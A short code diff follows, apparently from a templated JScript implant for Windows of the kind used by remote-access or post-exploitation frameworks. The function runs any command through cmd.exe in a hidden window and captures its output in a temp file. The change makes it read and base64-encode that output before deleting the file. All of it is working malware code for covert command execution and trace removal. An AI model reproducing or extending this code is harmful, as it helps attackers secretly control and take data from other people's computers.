@@ -1,6 +1,6 @@
 function cmd(command) {
   tmp = wscriptshell.ExpandEnvironmentStrings("%TEMP%");
-  stdout_path = tmp + '\\{{ command_stdout }}.tmp';
+  stdout_path = tmp + '\\{{ command_stdout }}.txt';
   fs = new ActiveXObject("Scripting.FileSystemObject");
   compsec = wscriptshell.ExpandEnvironmentStrings("%COMSPEC%");
   if (fs.FileExists(stdout_path)) {
@@ -9,7 +9,9 @@ function cmd(command) {
   command = compsec + ' /c ' + command + ' 1> ' + stdout_path + ' 2>&1';
   try {
     wscriptshell.Run(command, 0, true);
-    results = download(stdout_path);
+    fd = fs.OpenTextFile(stdout_path)
+    results = b64e(fd.ReadAll());
+    fd.close();
     delfile(stdout_path);
     return results;
   } catch (e) {
